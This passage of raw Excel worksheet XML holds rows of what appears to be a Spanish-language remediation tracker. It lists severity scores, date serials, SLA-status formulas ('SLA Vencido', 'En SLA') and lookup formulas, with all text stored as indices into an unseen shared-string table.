      <c r="AH516" t="str">
        <f>IFERROR(VLOOKUP(H516,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="517" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A517" s="5">
        <v>516</v>
      </c>
      <c r="B517" t="s">
        <v>32</v>
      </c>
      <c r="C517" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D517" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G517" s="60" t="s">
        <v>1879</v>
      </c>
      <c r="H517" t="s">
        <v>1908</v>
      </c>
      <c r="J517" t="s">
        <v>1325</v>
      </c>
      <c r="L517" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M517" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N517">
        <v>5.3</v>
      </c>
      <c r="Q517" t="s">
        <v>1796</v>
      </c>
      <c r="T517" s="1">
        <v>45913</v>
      </c>
      <c r="U517" s="76">
        <f t="shared" ca="1" si="26"/>
        <v>296</v>
      </c>
      <c r="V517" s="1">
        <f t="shared" si="24"/>
        <v>46003</v>
      </c>
      <c r="W517" s="76" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB517" t="s">
        <v>1896</v>
      </c>
      <c r="AC517" t="s">
        <v>1794</v>
      </c>
      <c r="AG517" s="51" t="s">
        <v>149</v>
      </c>
      <c r="AH517" t="str">
        <f>IFERROR(VLOOKUP(H517,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="518" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A518" s="5">
        <v>517</v>
      </c>
      <c r="B518" t="s">
        <v>32</v>
      </c>
      <c r="C518" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D518" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G518" s="60" t="s">
        <v>1879</v>
      </c>
      <c r="H518" t="s">
        <v>1909</v>
      </c>
      <c r="J518" t="s">
        <v>971</v>
      </c>
      <c r="L518" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M518" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N518">
        <v>5.3</v>
      </c>
      <c r="Q518" t="s">
        <v>1391</v>
      </c>
      <c r="T518" s="1">
        <v>45913</v>
      </c>
      <c r="U518" s="76">
        <f t="shared" ca="1" si="26"/>
        <v>296</v>
      </c>
      <c r="V518" s="1">
        <f t="shared" si="24"/>
        <v>46003</v>
      </c>
      <c r="W518" s="76" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB518" t="s">
        <v>1753</v>
      </c>
      <c r="AC518" t="s">
        <v>1754</v>
      </c>
      <c r="AG518" t="s">
        <v>969</v>
      </c>
      <c r="AH518" t="str">
        <f>IFERROR(VLOOKUP(H518,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="519" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A519" s="5">
        <v>518</v>
      </c>
      <c r="B519" t="s">
        <v>32</v>
      </c>
      <c r="C519" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D519" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G519" s="60" t="s">
        <v>1879</v>
      </c>
      <c r="H519" t="s">
        <v>1910</v>
      </c>
      <c r="J519" t="s">
        <v>971</v>
      </c>
      <c r="L519" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M519" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N519">
        <v>5.3</v>
      </c>
      <c r="Q519" t="s">
        <v>1395</v>
      </c>
      <c r="T519" s="1">
        <v>45913</v>
      </c>
      <c r="U519" s="76">
        <f t="shared" ca="1" si="26"/>
        <v>296</v>
      </c>
      <c r="V519" s="1">
        <f t="shared" si="24"/>
        <v>46003</v>
      </c>
      <c r="W519" s="76" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB519" t="s">
        <v>1753</v>
      </c>
      <c r="AC519" t="s">
        <v>1754</v>
      </c>
      <c r="AG519" t="s">
        <v>969</v>
      </c>
      <c r="AH519" t="str">
        <f>IFERROR(VLOOKUP(H519,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="520" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A520" s="5">
        <v>519</v>
      </c>
      <c r="B520" t="s">
        <v>32</v>
      </c>
      <c r="C520" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D520" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G520" s="60" t="s">
        <v>1879</v>
      </c>
      <c r="H520" t="s">
        <v>1911</v>
      </c>
      <c r="J520" t="s">
        <v>574</v>
      </c>
      <c r="L520" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M520" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N520">
        <v>5.3</v>
      </c>
      <c r="Q520" t="s">
        <v>176</v>
      </c>
      <c r="T520" s="1">
        <v>45905</v>
      </c>
      <c r="U520" s="76">
        <f t="shared" ca="1" si="26"/>
        <v>304</v>
      </c>
      <c r="V520" s="1">
        <f t="shared" si="24"/>
        <v>45995</v>
      </c>
      <c r="W520" s="76" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB520" t="s">
        <v>1893</v>
      </c>
      <c r="AC520" t="s">
        <v>1790</v>
      </c>
      <c r="AG520" t="s">
        <v>149</v>
      </c>
      <c r="AH520" t="str">
        <f>IFERROR(VLOOKUP(H520,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="521" spans="1:34" ht="246.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A521" s="5">
        <v>520</v>
      </c>
      <c r="B521" s="86" t="s">
        <v>32</v>
      </c>
      <c r="C521" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D521" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G521" s="60" t="s">
        <v>1816</v>
      </c>
      <c r="H521" t="s">
        <v>1912</v>
      </c>
      <c r="I521" t="s">
        <v>1913</v>
      </c>
      <c r="J521" t="s">
        <v>1914</v>
      </c>
      <c r="L521" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M521" s="50" t="s">
        <v>522</v>
      </c>
      <c r="N521">
        <v>7.1</v>
      </c>
      <c r="Q521" t="s">
        <v>1915</v>
      </c>
      <c r="T521" s="1">
        <v>45939</v>
      </c>
      <c r="U521" s="76">
        <f t="shared" ca="1" si="26"/>
        <v>270</v>
      </c>
      <c r="V521" s="1">
        <f t="shared" si="24"/>
        <v>45969</v>
      </c>
      <c r="W521" s="76" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB521" s="65" t="s">
        <v>1916</v>
      </c>
      <c r="AC521" s="65" t="s">
        <v>1917</v>
      </c>
      <c r="AD521" s="65" t="s">
        <v>1918</v>
      </c>
      <c r="AG521" s="65" t="s">
        <v>1823</v>
      </c>
      <c r="AH521" t="str">
        <f>IFERROR(VLOOKUP(H521,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="522" spans="1:34" ht="116" hidden="1" x14ac:dyDescent="0.35">
      <c r="A522" s="5">
        <v>521</v>
      </c>
      <c r="B522" t="s">
        <v>32</v>
      </c>
      <c r="C522" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D522" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G522" s="60" t="s">
        <v>1816</v>
      </c>
      <c r="H522" t="s">
        <v>1919</v>
      </c>
      <c r="I522" t="s">
        <v>1920</v>
      </c>
      <c r="J522" t="s">
        <v>910</v>
      </c>
      <c r="L522" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M522" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N522">
        <v>3.6</v>
      </c>
      <c r="Q522" t="s">
        <v>1921</v>
      </c>
      <c r="T522" s="1">
        <v>45939</v>
      </c>
      <c r="V522" s="1">
        <f t="shared" si="24"/>
        <v>46029</v>
      </c>
      <c r="W522" s="76" t="str">
        <f t="shared" si="25"/>
        <v>En SLA</v>
      </c>
      <c r="AB522" s="65" t="s">
        <v>1922</v>
      </c>
      <c r="AC522" s="65" t="s">
        <v>1923</v>
      </c>
      <c r="AD522" s="65" t="s">
        <v>1924</v>
      </c>
      <c r="AG522" s="65" t="s">
        <v>1823</v>
      </c>
      <c r="AH522" t="str">
        <f>IFERROR(VLOOKUP(H522,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="523" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A523" s="50">
        <v>522</v>
      </c>
      <c r="B523" t="s">
        <v>32</v>
      </c>
      <c r="C523" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D523" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G523" s="60" t="s">
        <v>1309</v>
      </c>
      <c r="H523" t="s">
        <v>1925</v>
      </c>
      <c r="J523" t="s">
        <v>1826</v>
      </c>
      <c r="L523" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M523" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N523">
        <v>4</v>
      </c>
      <c r="Q523" t="s">
        <v>1926</v>
      </c>
      <c r="T523" s="1">
        <v>45916</v>
      </c>
      <c r="U523" s="76">
        <f t="shared" ref="U523:U524" ca="1" si="27">TODAY()-T523</f>
        <v>293</v>
      </c>
      <c r="V523" s="1">
        <f t="shared" si="24"/>
        <v>46006</v>
      </c>
      <c r="W523" s="76" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AH523" t="str">
        <f>IFERROR(VLOOKUP(H523,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="524" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A524" s="50">
        <v>523</v>
      </c>
      <c r="B524" t="s">
        <v>32</v>
      </c>
      <c r="C524" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D524" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G524" s="60" t="s">
        <v>1309</v>
      </c>
      <c r="H524" t="s">
        <v>1927</v>
      </c>
      <c r="J524" t="s">
        <v>1928</v>
      </c>
      <c r="L524" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M524" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N524">
        <v>4.8</v>
      </c>
      <c r="Q524" t="s">
        <v>1929</v>
      </c>
      <c r="T524" s="1">
        <v>45941</v>
      </c>
      <c r="U524" s="76">
        <f t="shared" ca="1" si="27"/>
        <v>268</v>
      </c>
      <c r="V524" s="1">
        <f t="shared" si="24"/>
        <v>46031</v>
      </c>
      <c r="W524" s="76" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AH524" t="str">
        <f>IFERROR(VLOOKUP(H524,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="525" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A525" s="50">
        <v>524</v>
      </c>
      <c r="B525" t="s">
        <v>32</v>
      </c>
      <c r="C525" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D525" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G525" s="60" t="s">
        <v>1309</v>
      </c>
      <c r="H525" t="s">
        <v>1930</v>
      </c>
      <c r="J525" t="s">
        <v>1931</v>
      </c>
      <c r="L525" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M525" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N525">
        <v>4.8</v>
      </c>
      <c r="Q525" t="s">
        <v>1929</v>
      </c>
      <c r="T525" s="1">
        <v>45942</v>
      </c>
      <c r="V525" s="1">
        <f t="shared" si="24"/>
        <v>46032</v>
      </c>
      <c r="W525" s="76" t="str">
        <f t="shared" si="25"/>
        <v>En SLA</v>
      </c>
      <c r="AH525" t="str">
        <f>IFERROR(VLOOKUP(H525,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="526" spans="1:34" ht="87" hidden="1" x14ac:dyDescent="0.35">
      <c r="A526" s="50">
        <v>525</v>
      </c>
      <c r="B526" s="50" t="s">
        <v>32</v>
      </c>
      <c r="C526" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D526" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G526" s="60" t="s">
        <v>867</v>
      </c>
      <c r="I526" t="s">
        <v>1932</v>
      </c>
      <c r="J526" t="s">
        <v>1933</v>
      </c>
      <c r="L526" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M526" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N526">
        <v>3</v>
      </c>
      <c r="Q526" t="s">
        <v>977</v>
      </c>
      <c r="T526" s="1">
        <v>45939</v>
      </c>
      <c r="V526" s="1">
        <f t="shared" si="24"/>
        <v>46059</v>
      </c>
      <c r="W526" s="76" t="str">
        <f t="shared" si="25"/>
        <v>En SLA</v>
      </c>
      <c r="AB526" s="65" t="s">
        <v>1934</v>
      </c>
      <c r="AC526" s="65" t="s">
        <v>1935</v>
      </c>
      <c r="AD526" s="65" t="s">
        <v>1936</v>
      </c>
      <c r="AG526" s="65" t="s">
        <v>974</v>
      </c>
      <c r="AH526" t="str">
        <f>IFERROR(VLOOKUP(H526,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="527" spans="1:34" ht="174" x14ac:dyDescent="0.35">
      <c r="A527" s="50">
        <v>526</v>
      </c>
      <c r="B527" t="s">
        <v>32</v>
      </c>
      <c r="C527" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D527" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G527" s="60" t="s">
        <v>1165</v>
      </c>
      <c r="H527" t="s">
        <v>1937</v>
      </c>
      <c r="I527" t="s">
        <v>1938</v>
      </c>
      <c r="J527" t="s">
        <v>1939</v>
      </c>
      <c r="L527" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M527" s="50" t="s">
        <v>522</v>
      </c>
      <c r="N527">
        <v>8.3000000000000007</v>
      </c>
      <c r="Q527" t="s">
        <v>1940</v>
      </c>
      <c r="T527" s="1">
        <v>45953</v>
      </c>
      <c r="U527" s="76">
        <f t="shared" ref="U527" ca="1" si="28">TODAY()-T527</f>
        <v>256</v>
      </c>
      <c r="V527" s="1">
        <f t="shared" si="24"/>
        <v>45983</v>
      </c>
      <c r="W527" s="76" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB527" s="65" t="s">
        <v>1941</v>
      </c>
      <c r="AC527" s="65" t="s">
        <v>1942</v>
      </c>
      <c r="AD527" s="65" t="s">
        <v>1943</v>
      </c>
      <c r="AG527" s="65" t="s">
        <v>1179</v>
      </c>
      <c r="AH527" t="str">
        <f>IFERROR(VLOOKUP(H527,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="528" spans="1:34" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A528" s="50">
        <v>527</v>
      </c>
      <c r="B528" t="s">
        <v>32</v>
      </c>
      <c r="C528" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D528" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G528" s="60" t="s">
        <v>1165</v>
      </c>
      <c r="H528" t="s">
        <v>1944</v>
      </c>
      <c r="I528" t="s">
        <v>1945</v>
      </c>
      <c r="J528" t="s">
        <v>1946</v>
      </c>
      <c r="L528" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M528" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N528">
        <v>6.5</v>
      </c>
      <c r="Q528" t="s">
        <v>1947</v>
      </c>
      <c r="T528" s="1">
        <v>45953</v>
      </c>
      <c r="V528" s="1">
        <f t="shared" si="24"/>
        <v>46043</v>
      </c>
      <c r="W528" s="76" t="str">
        <f t="shared" si="25"/>
        <v>En SLA</v>
      </c>
      <c r="AB528" s="65" t="s">
        <v>1948</v>
      </c>
      <c r="AC528" s="65" t="s">
        <v>1942</v>
      </c>
      <c r="AD528" s="65" t="s">
        <v>1949</v>
      </c>
      <c r="AG528" s="65" t="s">
        <v>1179</v>
      </c>
      <c r="AH528" t="str">
        <f>IFERROR(VLOOKUP(H528,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="529" spans="1:34" ht="145" x14ac:dyDescent="0.35">
      <c r="A529" s="50">
        <v>528</v>
      </c>
      <c r="B529" t="s">
        <v>32</v>
      </c>
      <c r="C529" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D529" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G529" s="60" t="s">
        <v>1165</v>
      </c>
      <c r="I529" t="s">
        <v>1950</v>
      </c>
      <c r="J529" t="s">
        <v>1951</v>
      </c>
      <c r="L529" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M529" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N529">
        <v>3.1</v>
      </c>
      <c r="Q529" t="s">
        <v>1947</v>
      </c>
      <c r="T529" s="1">
        <v>45953</v>
      </c>
      <c r="V529" s="1">
        <f t="shared" si="24"/>
        <v>46073</v>
      </c>
      <c r="W529" s="76" t="str">
        <f t="shared" si="25"/>
        <v>En SLA</v>
      </c>
      <c r="AB529" s="65" t="s">
        <v>1952</v>
      </c>
      <c r="AC529" s="65" t="s">
        <v>1953</v>
      </c>
      <c r="AD529" s="65" t="s">
        <v>1954</v>
      </c>
      <c r="AG529" s="65" t="s">
        <v>1179</v>
      </c>
      <c r="AH529" t="str">
        <f>IFERROR(VLOOKUP(H529,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="530" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A530" s="50">
        <v>529</v>
      </c>
      <c r="B530" t="s">
        <v>32</v>
      </c>
      <c r="C530" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D530" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G530" s="60" t="s">
        <v>138</v>
      </c>
      <c r="I530" t="s">
        <v>1955</v>
      </c>
      <c r="J530" t="s">
        <v>890</v>
      </c>
      <c r="L530" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M530" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N530">
        <v>5.3</v>
      </c>
      <c r="Q530" t="s">
        <v>1956</v>
      </c>
      <c r="T530" s="1">
        <v>45953</v>
      </c>
      <c r="V530" s="1">
        <f t="shared" si="24"/>
        <v>46043</v>
      </c>
      <c r="W530" s="76" t="str">
        <f t="shared" si="25"/>
        <v>En SLA</v>
      </c>
      <c r="AB530" s="65" t="s">
        <v>1957</v>
      </c>
      <c r="AC530" s="65" t="s">
        <v>1958</v>
      </c>
      <c r="AD530" s="65" t="s">
        <v>1959</v>
      </c>
      <c r="AG530" s="65" t="s">
        <v>149</v>
      </c>
      <c r="AH530" t="str">
        <f>IFERROR(VLOOKUP(H530,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="531" spans="1:34" ht="145" hidden="1" x14ac:dyDescent="0.35">
      <c r="A531" s="50">
        <v>530</v>
      </c>
      <c r="B531" t="s">
        <v>32</v>
      </c>
      <c r="C531" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D531" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G531" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="H531" t="s">
        <v>1960</v>
      </c>
      <c r="I531" t="s">
        <v>1961</v>
      </c>
      <c r="J531" t="s">
        <v>1095</v>
      </c>
      <c r="L531" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M531" s="50" t="s">
        <v>42</v>
      </c>
      <c r="N531">
        <v>10</v>
      </c>
      <c r="Q531" s="65" t="s">
        <v>1962</v>
      </c>
      <c r="T531" s="1">
        <v>45959</v>
      </c>
      <c r="V531" s="1">
        <f t="shared" si="24"/>
        <v>45969</v>
      </c>
      <c r="W531" s="76" t="str">
        <f t="shared" si="25"/>
        <v>En SLA</v>
      </c>
      <c r="AB531" s="65" t="s">
        <v>1963</v>
      </c>
      <c r="AC531" s="65" t="s">
        <v>1964</v>
      </c>
      <c r="AD531" s="65" t="s">
        <v>1965</v>
      </c>
      <c r="AG531" s="65" t="s">
        <v>1092</v>
      </c>
      <c r="AH531" t="str">
        <f>IFERROR(VLOOKUP(H531,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="532" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A532" s="50">
        <v>531</v>
      </c>
      <c r="B532" t="s">
        <v>32</v>
      </c>
      <c r="C532" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D532" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G532" s="60" t="s">
        <v>1539</v>
      </c>
      <c r="H532" t="s">
        <v>1966</v>
      </c>
      <c r="J532" t="s">
        <v>1271</v>
      </c>
      <c r="L532" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M532" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q532" t="s">
        <v>999</v>
      </c>
      <c r="T532" s="1">
        <v>45960</v>
      </c>
      <c r="U532" s="76">
        <f t="shared" ref="U532:U533" ca="1" si="29">TODAY()-T532</f>
        <v>249</v>
      </c>
      <c r="V532" s="1">
        <f t="shared" si="24"/>
        <v>46050</v>
      </c>
      <c r="W532" s="76" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB532" t="s">
        <v>1967</v>
      </c>
      <c r="AC532" t="s">
        <v>1968</v>
      </c>
      <c r="AG532" s="65" t="s">
        <v>747</v>
      </c>
      <c r="AH532" t="str">
        <f>IFERROR(VLOOKUP(H532,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="533" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A533" s="50">
        <v>532</v>
      </c>
      <c r="B533" t="s">
        <v>32</v>
      </c>
      <c r="C533" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D533" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G533" s="60" t="s">
        <v>138</v>
      </c>
      <c r="H533" t="s">
        <v>1969</v>
      </c>
      <c r="J533" t="s">
        <v>890</v>
      </c>
      <c r="L533" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M533" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q533" t="s">
        <v>1970</v>
      </c>
      <c r="T533" s="1">
        <v>45960</v>
      </c>
      <c r="U533" s="76">
        <f t="shared" ca="1" si="29"/>
        <v>249</v>
      </c>
      <c r="V533" s="1">
        <f t="shared" si="24"/>
        <v>46050</v>
      </c>
      <c r="W533" s="76" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB533" t="s">
        <v>1971</v>
      </c>
      <c r="AC533" t="s">
        <v>1972</v>
      </c>
      <c r="AG533" s="65" t="s">
        <v>149</v>
      </c>
      <c r="AH533" t="str">
        <f>IFERROR(VLOOKUP(H533,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="534" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A534" s="50">
        <v>533</v>
      </c>
      <c r="B534" t="s">
        <v>32</v>
      </c>
      <c r="C534" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D534" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G534" s="60" t="s">
        <v>1084</v>
      </c>
      <c r="H534" t="s">
        <v>1973</v>
      </c>
      <c r="J534" t="s">
        <v>1490</v>
      </c>
      <c r="L534" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M534" s="50" t="s">
        <v>522</v>
      </c>
      <c r="Q534" t="s">
        <v>1974</v>
      </c>
      <c r="T534" s="1">
        <v>45982</v>
      </c>
      <c r="V534" s="1">
        <f t="shared" si="24"/>
        <v>46012</v>
      </c>
      <c r="W534" s="76" t="str">
        <f t="shared" si="25"/>
        <v>En SLA</v>
      </c>
      <c r="AB534" t="s">
        <v>1975</v>
      </c>
      <c r="AC534" t="s">
        <v>1976</v>
      </c>
      <c r="AG534" s="65" t="s">
        <v>1092</v>
      </c>
      <c r="AH534" t="str">
        <f>IFERROR(VLOOKUP(H534,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="535" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A535" s="50">
        <v>534</v>
      </c>
      <c r="B535" t="s">
        <v>32</v>
      </c>
      <c r="C535" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D535" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G535" s="60" t="s">
        <v>1816</v>
      </c>
      <c r="H535" t="s">
        <v>1977</v>
      </c>
      <c r="L535" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M535" s="50" t="s">
        <v>61</v>
      </c>
      <c r="Q535" t="s">
        <v>1978</v>
      </c>
      <c r="T535" s="1">
        <v>45976</v>
      </c>
      <c r="V535" s="1">
        <f t="shared" si="24"/>
        <v>46066</v>
      </c>
      <c r="W535" s="76" t="str">
        <f t="shared" si="25"/>
        <v>En SLA</v>
      </c>
      <c r="AB535" t="s">
        <v>1979</v>
      </c>
      <c r="AC535" t="s">
        <v>1980</v>
      </c>
      <c r="AG535" s="65" t="s">
        <v>1823</v>
      </c>
      <c r="AH535" t="str">
        <f>IFERROR(VLOOKUP(H535,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="536" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A536" s="50">
        <v>535</v>
      </c>
      <c r="B536" t="s">
        <v>32</v>
      </c>
      <c r="C536" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D536" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G536" s="60" t="s">
        <v>1203</v>
      </c>
      <c r="H536" t="s">
        <v>1981</v>
      </c>
      <c r="I536" t="s">
        <v>1982</v>
      </c>
      <c r="J536" t="s">
        <v>1095</v>
      </c>
      <c r="L536" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M536" s="50" t="s">
        <v>42</v>
      </c>
      <c r="N536">
        <v>10</v>
      </c>
      <c r="Q536" t="s">
        <v>1983</v>
      </c>
      <c r="T536" s="1">
        <v>45988</v>
      </c>
      <c r="U536" s="76">
        <f t="shared" ref="U536:U599" ca="1" si="30">TODAY()-T536</f>
        <v>221</v>
      </c>
      <c r="V536" s="1">
        <f t="shared" si="24"/>
        <v>45998</v>
      </c>
      <c r="W536" s="76" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB536" s="65" t="s">
        <v>1984</v>
      </c>
      <c r="AC536" s="65" t="s">
        <v>1985</v>
      </c>
      <c r="AD536" s="65" t="s">
        <v>1986</v>
      </c>
      <c r="AE536" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG536" s="65" t="s">
        <v>1092</v>
      </c>
      <c r="AH536" t="str">
        <f>IFERROR(VLOOKUP(H536,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="537" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A537" s="50">
        <v>536</v>
      </c>
      <c r="B537" t="s">
        <v>32</v>
      </c>
      <c r="C537" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D537" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G537" s="60" t="s">
        <v>1203</v>
      </c>
      <c r="H537" t="s">
        <v>1988</v>
      </c>
      <c r="I537" t="s">
        <v>1989</v>
      </c>
      <c r="J537" t="s">
        <v>80</v>
      </c>
      <c r="L537" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M537" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N537">
        <v>5.0999999999999996</v>
      </c>
      <c r="Q537" t="s">
        <v>1990</v>
      </c>
      <c r="T537" s="1">
        <v>45992</v>
      </c>
      <c r="U537" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>217</v>
      </c>
      <c r="V537" s="1">
        <f t="shared" si="24"/>
        <v>46082</v>
      </c>
      <c r="W537" s="76" t="str">
        <f t="shared" ca="1" si="25"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB537" s="65" t="s">
        <v>1991</v>
      </c>
      <c r="AC537" s="65" t="s">
        <v>1992</v>
      </c>
      <c r="AD537" s="65" t="s">
        <v>1993</v>
      </c>
      <c r="AE537" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG537" s="65" t="s">
        <v>1092</v>
      </c>
      <c r="AH537" t="str">
        <f>IFERROR(VLOOKUP(H537,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="538" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A538" s="50">
        <v>537</v>
      </c>
      <c r="B538" t="s">
        <v>32</v>
      </c>
      <c r="C538" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D538" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G538" s="60" t="s">
        <v>1203</v>
      </c>
      <c r="H538" t="s">
        <v>1994</v>
      </c>
      <c r="I538" t="s">
        <v>1995</v>
      </c>
      <c r="J538" t="s">
        <v>1198</v>
      </c>
      <c r="L538" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M538" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N538">
        <v>4.0999999999999996</v>
      </c>
